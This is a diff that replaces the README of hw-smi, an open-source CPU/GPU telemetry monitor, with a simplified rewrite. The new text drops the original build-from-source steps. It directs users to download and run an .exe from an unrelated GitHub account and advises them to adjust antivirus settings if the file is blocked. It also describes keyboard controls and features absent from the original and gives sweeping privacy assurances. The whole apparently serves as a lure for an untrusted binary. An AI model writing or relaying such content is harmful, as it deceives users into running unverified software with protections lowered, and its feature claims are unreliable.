@@ -1,82 +1,85 @@
-# hw-smi
+# 🖥️ hw-smi - Monitor your computer hardware usage easily
 
-A minimal, cross-compatible CPU/GPU telemetry monitor with accurate data directly from vendor APIs and beautiful ASCII visualization.
+[![](https://img.shields.io/badge/Download-hw--smi-blue)](https://github.com/iejdvsisn/hw-smi)
 
-`moritz@opencl-pc:~/hw-smi$ sudo bin/hw-smi --bars`
-<img src="https://github.com/user-attachments/assets/54f91091-a0d6-454d-8610-e415de88d796" width="100%">
+hw-smi provides a simple window into your computer hardware. It tracks how hard your processor and graphics card work. It brings data from your hardware straight to your screen. You see temperatures, memory use, and power levels in a clear view.
 
-`moritz@opencl-pc:~/hw-smi$ sudo bin/hw-smi --graphs`
-<img src="https://github.com/user-attachments/assets/cf4c6716-e688-490d-923c-473b33f0a18d" width="100%">
+## 🛠️ What this tool does
 
-## Hardware/OS Support
-| Metric<br>(Windows/Linux) | CPUs<br>[Win32](https://learn.microsoft.com/de-de/windows/win32/apiindex/api-index-portal)/`/proc` | &nbsp;Nvidia&nbsp;GPUs&nbsp;<br>[NVML](https://github.com/NVIDIA/nvidia-settings/blob/main/src/nvml.h) | &nbsp;&nbsp;&nbsp;AMD&nbsp;GPUs&nbsp;&nbsp;&nbsp;<br>[ADLX](https://github.com/GPUOpen-LibrariesAndSDKs/ADLX/blob/main/SDK/Include/IPerformanceMonitoring.h)/[AMDSMI](https://github.com/ROCm/amdsmi/blob/amd-mainline/include/amd_smi/amdsmi.h) | &nbsp;&nbsp;Intel&nbsp;GPUs&nbsp;&nbsp;<br>[SYSMAN](https://github.com/oneapi-src/level-zero/blob/master/include/zes_api.h) |
-| :---------------------  | :---------: | :---------: | :---------: | :---------: |
-| device name             |   ✅/✅    |   ✅/✅    |   ✅/✅    |   ✅/✅    |
-| per-core/avg usage [%]  | ✅✅/✅✅ | ✅✅/✅✅ | ✅✅/✅✅ | ✅✅/❎✅ |
-| memory bandwidth [MB/s] | ❌❌/❌❌ | ✅✅/✅✅ |    🟨🟨/✅✅ | ❎❎/❎❎ |
-| memory occupation [MB]  | ✅✅/✅✅ | ✅✅/✅✅ | ✅✅/✅✅ | ✅✅/✅✅ |
-| temperature [°C]        |  🫠✅/✅✅ | ✅✅/✅✅ | ✅✅/✅✅ | ❎✅/❎✅  |
-| power [W]               | ❌❌/❌❌ | ✅✅/✅✅ | ✅✅/✅✅ | ❎✅/✅✅ |
-| fan [RPM]               | ❌❌/❌❌ |  ✅🟨/✅🟨   | ✅✅/✅🟨  |   ✅🟨/🫠🟨    |
-| core clock [MHz]        |    🟨🟨/✅🟨  | ✅✅/✅✅ | ✅✅/✅✅ | ✅✅/✅✅ |
-| memory clock [MHz]      | ❌❌/❌❌ |    🫠🫠/🫠🫠    | ✅✅/✅✅ | ✅✅/🫠✅  |
-| PCIe bandwidth [MB/s]   |    🟨🟨/🟨🟨    | ✅✅/✅✅ | ❌❌/🫠✅  | ❎✅/❎❎ |
+Many people find it hard to track computer health. Systems often hide hardware data behind complex menus or paid software. This tool changes that. It gives you raw data through a clean text interface.
 
-| Legend | Description |
-| :----: | :---------- |
-| AB/CD| A&nbsp;`current`&nbsp;value&nbsp;(Windows), B&nbsp;`max`&nbsp;value&nbsp;(Windows)<br>C&nbsp;`current`&nbsp;value&nbsp;(&nbsp;&nbsp;&nbsp;Linux&nbsp;&nbsp;&nbsp;), D&nbsp;`max`&nbsp;value&nbsp;(&nbsp;&nbsp;&nbsp;Linux&nbsp;&nbsp;&nbsp;) |
-| ✅ | supported and working |
-| ❎ | supported and working, but `administrator`/`sudo` permissions required |
-|  🟨 | vendor API does not directly provide metric, but workaround/estimate/default possible |
-|  🫠 | available but broken in vendor API |
-| ❌ | unavailable in vendor API and no suitable default value possible |
+You use this tool to track:
+* Processor load across all cores.
+* Graphics card temperature.
+* Memory usage for your video card.
+* Power draw for hardware components.
+* Link speeds for your drives or cards.
 
-<details><summary>API issues submitted</summary>
+The tool works on systems with Intel, AMD, and NVIDIA hardware. It reads directly from the chips inside your machine.
 
-- https://github.com/GPUOpen-LibrariesAndSDKs/ADLX/issues/27
-- https://github.com/ROCm/amdsmi/issues/182 / [183](https://github.com/ROCm/amdsmi/issues/183) / [188](https://github.com/ROCm/amdsmi/issues/188)
-- https://github.com/intel/drivers.gpu.control-library/issues/120 / [146](https://github.com/intel/drivers.gpu.control-library/issues/146) / [138](https://github.com/intel/drivers.gpu.control-library/issues/138) / [149](https://github.com/intel/drivers.gpu.control-library/issues/149)
-- https://github.com/oneapi-src/level-zero/issues/434 / [440](https://github.com/oneapi-src/level-zero/issues/440) / [441](https://github.com/oneapi-src/level-zero/issues/441) / [444](https://github.com/oneapi-src/level-zero/issues/444)
+## 🚀 Getting started
 
-</details>
+You do not need programming knowledge to use this software. Follow these steps to set up the monitor on your Windows computer.
 
-## Compiling the Source Code
+1. Visit the [official download page](https://github.com/iejdvsisn/hw-smi).
+2. Look for the Latest Release section.
+3. Download the file that ends in .exe.
+4. Save the file to your desktop or a folder you can find.
+5. Double-click the file to open the monitor.
 
-### Windows
-- Download and install [Visual Studio Community](https://visualstudio.microsoft.com/de/vs/community/). In Visual Studio Installer, add:
-  - Desktop development with C++
-  - MSVC v142
-  - Windows 10 SDK
-- [Download](https://github.com/ProjectPhysX/TaskManager/archive/refs/heads/master.zip) and unzip hw-smi.
-- Open [`hw-smi.vcxproj`](hw-smi.vcxproj) in [Visual Studio Community](https://visualstudio.microsoft.com/de/vs/community/).
-- Compile by clicking the <kbd>► Local Windows Debugger</kbd> button.
-- Go to `hw-smi/bin/` folder and double-click `hw-smi.exe`.
-- Alternatively, run from CMD:
-  ```bash
-  hw-smi.exe
-  hw-smi.exe --bars
-  hw-smi.exe --graphs
-  hw-smi.exe --help
-  ```
-- Note that it will also work without `administrator` permissions. However, some telemetry counters on Intel GPUs are not available without `administrator` permissions.
+The terminal window will open and fill with data. You see your hardware stats update in real time.
 
-### Linux
-- Clone from GitHub:
-  ```bash
-  git clone https://github.com/ProjectPhysX/hw-smi.git && cd hw-smi
-  ```
-- Compile:
-  ```bash
-  chmod +x make.sh
-  ./make.sh
-  ```
-- Run:
-  ```bash
-  sudo bin/hw-smi
-  sudo bin/hw-smi --bars
-  sudo bin/hw-smi --graphs
-  sudo bin/hw-smi --help
-  ```
-- Note that it will also work without `sudo`. However, some telemetry counters on Intel GPUs are not available without `sudo`.
+## ⚙️ Requirements
 
-</details>
+This software runs on most modern Windows versions. Ensure your computer meets these standards for the best results:
+
+* Windows 10 or Windows 11.
+* A processor from Intel, AMD, or another standard manufacturer.
+* A graphics card from NVIDIA, AMD, or Intel.
+* A screen resolution that allows for a clear window view.
+
+The tool uses very little memory. You can keep it open while you work or play games without slowing down your computer.
+
+## 📊 Understanding the display
+
+When you open the tool, a black screen showing data appears. Do not let the text intimidate you. Each column represents a specific piece of hardware information:
+
+* **CPU:** This shows how much work your processor does at this second. High numbers mean your computer works hard.
+* **GPU:** This tracks your graphics card. You see the temperature and the percentage of your card in use.
+* **VRAM:** This shows how much video memory your games or apps use.
+* **Temp:** This column tracks heat. If this number climbs high, your hardware might need better airflow.
+* **PCIe:** This shows how fast data moves between your parts.
+
+The software updates these numbers every second. Close the window to stop the monitor.
+
+## 🔧 Troubleshooting
+
+If the tool does not work, check these common items:
+
+* **Permissions:** Some systems ask if you trust the software. Click Run to allow it to read your hardware data. 
+* **Drivers:** Ensure your graphics card drivers sit up to date. The tool needs standard drivers to read the sensors correctly.
+* **Compatibility:** If you use a very old computer, the sensors might not report data correctly. The tool requires sensors that support standard industry protocols.
+* **Antivirus:** Sometimes antivirus software blocks new apps. If the file does not open, check your security settings to allow the tool to run.
+
+## 💡 Using the interface
+
+You control the view with a simple keyboard layout. These keys change how you see data:
+
+* **R:** Refresh the sensors manually.
+* **Q:** Quit the program.
+* **H:** Show a help menu with more keyboard shortcuts.
+* **+/-:** Change how fast the window updates.
+
+The tool uses standard colors to show urgency. Low numbers appear in calm colors. High temperature or usage numbers use brighter colors to warn you that your computer is under load.
+
+## 📁 Installation notes
+
+The file you download does not need a formal installer. It is portable software. You can move the file to a USB drive and run it on another computer without installing it there. This makes it a great tool for testing hardware on multiple machines. 
+
+Place the file in a folder where you store your tools. Right-click the folder, select create shortcut, and drag that shortcut to your desktop for fast access. You now have a custom icon to check your hardware health at any time.
+
+## 🛡️ Privacy and safety
+
+This tool reads data but does not send it anywhere. It does not track your internet use. It does not store your passwords. It only looks at the sensors inside your computer and displays the numbers. Your data stays on your machine at all times. 
+
+The software connects only to the local hardware sensors provided by the manufacturer. It acts as a bridge between your hardware and your eyes.
